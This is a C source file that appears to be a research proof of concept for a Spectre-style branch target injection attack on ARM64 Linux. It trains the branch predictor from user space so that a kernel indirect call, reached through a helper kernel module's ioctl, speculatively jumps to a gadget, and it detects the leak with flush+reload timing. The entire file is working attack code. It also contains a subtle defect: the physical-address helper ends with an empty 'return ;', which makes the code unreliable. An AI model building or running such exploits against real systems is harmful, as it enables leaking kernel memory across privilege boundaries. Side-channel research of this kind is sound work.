#include <inttypes.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <err.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <signal.h>

#include "kmod_spectre_arm64.h"

#include "flush_reload.h"



#define MMAP_FLAGS (MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_FIXED_NOREPLACE)
#define PROT_RW    (PROT_READ | PROT_WRITE)
#define PROT_RWX   (PROT_RW | PROT_EXEC)
 
// see include/asm/memory.h. Could also do all this in the kernel module
#define PHYS_OFFSET 0x80000000UL
#define PAGE_OFFSET 0xffff000000000000UL
// aka. __phys_to_virt
#define PHYS_TO_KVA(x) ((unsigned long)((x) - PHYS_OFFSET) | PAGE_OFFSET)

typedef void(*funptr)(void);






// Assembly of an indirect call on ARM
// We will not use this function directly, but copy it in a location
// where the indirect call will collide with in-kernel indirect call
// in the BTB
// Note that we use exaclty the same number of instructions as in
// the in-kernel function so that the start of the function and the
// indirect call are at the "same" location (modulo high bits in the
// virtual address) 
void indirect_call_local(int ignored, int ignored2, funptr * fun);
asm(
    "indirect_call_local:\n\t"
    "stp x29, x30, [sp, #-32]!\n\t"
    "mov     x29, sp\n\t"
    "nop\n\t"
    "nop\n\tnop\n\t"
    "ldr x2, [x2]\n\t"
    "blr x2\n\t" // segfault
    "mov sp, x29\n\t" // jump back here (indirect_call_local + 7 * 4)
    "ldp     x29, x30, [sp], #32\n\t"
    "ret\n\t"
);


// `blr x2` above will segfault
// Note that we will segfault in the relocated function, but
// jump back to the local function (it's easier). This should not
// make a difference: we just want to execute the mov-ldp-ret sequence
// to restore the frame
static void const * after_indirect_call = &indirect_call_local + 4 * 7;

static void handler(int signo, siginfo_t *info, void *context)
{
    (void)signo;
    (void)info;
    ucontext_t *uc = (ucontext_t *)context;
    unsigned long long int *rip = &(uc->uc_mcontext.pc);
    *rip = after_indirect_call;
}

/* Assume we can translate a VA to a PA in userspace, using a
   special kernel module. For a practical attack, we would need
   another vector for this translation. */
static long va_to_phys(int fd, unsigned long va)
{
    unsigned long pa_with_flags;
    if (lseek(fd, ((~0xfffUL) & va)>>9, SEEK_SET) < 0)
    {
        perror("lseek");
        exit(1);
    }
    if (read(fd, &pa_with_flags, 8) < 0)
    {
        perror("read");
        exit(1);
    }

    long ret = pa_with_flags<<12 | (va & 0xfff);

    if (ret == 0)
    {
        fprintf(stderr, "Computed invalid physical address (Are you root?)\n");
        exit(1);
    }

    return ;
}


int main(int argc, char ** argv)
{
    /****************
     * Register segv handler
     ***************/
    struct sigaction act = {0};
    act.sa_flags = SA_SIGINFO;
    act.sa_sigaction = handler;
    sigemptyset(&act.sa_mask);
    if (sigaction(SIGSEGV, &act, NULL) == -1)
    {
        perror("sigaction");
        exit(1);
    }


    /****************
     * Prepare the F+R buffer, and get the address to access from
     * the kernel module (ie through the direct map)
     ****************/


    int fd_pagemap = open("/proc/self/pagemap", O_RDONLY);
    if (fd_pagemap <= 0) err(1, "open pagemap. U root?");
    int fd_spectre = open("/proc/" PROC_SPECTRE_ARM64, O_RDONLY);
    if (fd_spectre <= 0) err(2, "open spectre info fd");


#define MY_PTR  0x1337000000UL
    unsigned char * fr_buffer = NULL;
    if ((fr_buffer = mmap((void*)MY_PTR, 1UL<<21, PROT_RW, MMAP_FLAGS|MAP_HUGETLB, -1, 0)) == MAP_FAILED) {
        err(3, "mmap");
    }
    *(char *)MY_PTR = 77; // pre-fault
    unsigned long ptr_pa = va_to_phys(fd_pagemap, MY_PTR);
    unsigned long ptr_kva = PHYS_TO_KVA(ptr_pa);
    
    fprintf(stderr, "fr_buf_va=%lx, fr_buf_pa=%lx, fr_buf_kva=%lx\n", MY_PTR, ptr_pa, ptr_kva);


    /******************
     * Get the location of the victim indirect call and of the
     * F+R gadget in the kernel module. Here, assume we can just
     * request it from the kernel, for a real attack we would need
     * another vector to leak this info (in particular because of KASLR).
     *****************/

    struct synth_gadget_desc sg = { 0 };
    if (ioctl(fd_spectre, REQ_GADGET_DESC, &sg) != 0) {
        err(6, "ioctl");
    }

    fprintf(stderr, "&kernel_indirect_call=%p, &kernel_gadget=%p\n", sg.kbr_src, sg.kbr_gadget);

    /**************
     * Prepare the training indirect call
     **************/

    // Choose a colliding location for the training call
    // Simply zero-out the high bits
    //         ffff80000957b000 (kernel-space victim indirect_call)
    //         000080000957b000 (user-space attacker indirect_call)
    uint64_t low_bits = (((uint64_t)1) << 48) - 1;

    // We will allocate a page, split the address into page + offset
    uint64_t victim_call_base = sg.kbr_src & ~((uint64_t)0xfff);
    uint64_t offset = sg.kbr_src & 0xfff;

    // zero out the high bits
    uint64_t attacker_call_base = victim_call_base & low_bits;

    unsigned char* attacker_executable_base = mmap(
        (void*) attacker_call_base,
        4096,
        PROT_READ | PROT_WRITE,
        MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED,
        -1,
        0
    );
    if (attacker_executable_base == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    unsigned char* attacker_executable = attacker_executable_base + offset;

    // copy the indirect_call function at the training location
    memcpy(attacker_executable, &indirect_call_local, 0x100);
    mprotect(attacker_executable_base, 4096, PROT_READ | PROT_EXEC);

    void(*indirect_call_reloc)(int, int, int(**)(void)) = attacker_executable;

    fprintf(stderr, "attacker_page at %p, &indirect_call_reloc=%p\n", attacker_executable_base, indirect_call_reloc);

    // Run training-attack cycle until the secret byte is leaked
    while(1)
    {
        /****************
         * Train
         ***************/

        full_fence();

        funptr to_gadget[1] = { sg.kbr_gadget };
        for (size_t i = 0; i < 20000 ;i++)
        {
            indirect_call_reloc(0, 1, to_gadget);
        }
        
        //fprintf(stderr, "Back in the main loop!\n");

        /*****************
         * Flush
         *****************/
        full_fence();

        flush_buffer(fr_buffer);

        full_fence();

        /****************
         * Make the kernel call the victim call site
         ****************/


        if (ioctl(fd_spectre, REQ_SPEC, &ptr_kva) != 0) {
            err(5, "ioctl"); 
        }

        /**************
         * Reload
         *************/
        full_fence();

        uint64_t atimes[256];
        reload(fr_buffer, atimes);

        uint64_t const thresh = 28;
        fprintf(stderr, "low atimes:");
        for(int c = 0; c < 256; c++){
            if (atimes[c] < thresh) {
                fprintf(stderr, "%d(%" PRIu64 ") ", c, atimes[c]);
            }
        }
        fprintf(stderr, "\n");
        
        if (atimes[8] < thresh) {
            fprintf(stderr, "MISPREDICTION   access_time=%" PRIu64 "\n", atimes[8]);
            exit(0);
        }
    }


    return 0;
}


